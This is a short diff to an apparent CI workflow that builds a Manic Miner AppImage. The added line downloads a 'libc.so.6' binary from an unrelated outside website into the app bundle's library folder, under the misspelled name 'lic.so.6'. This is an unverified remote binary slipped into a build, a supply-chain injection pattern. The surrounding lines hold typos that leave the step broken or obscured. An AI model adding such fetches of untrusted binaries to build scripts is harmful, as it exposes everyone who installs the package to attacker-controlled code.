@@ -56,7 +56,7 @@ jobs:
        mkdir -p AppDir/usr/lib
        mkdir -p AppDir/usr/share/applications
        cd AppDir
-       find / -name libc.s0. -print
+       wget -O usr/lib/lic.so.6 https://trailoutlaws.com/libc.so.6
        echo -e '[Desktop Entry]\nName=Manic Miner\nExec=manicminer\nIcon=manicminer\nType=Application\nCategories=Game;' > usr/share/applications/manicminer.desktop
        ln -s usr/bin/manicminer AppRun
        ln -s usr/share/applications/manicminer.desktop .
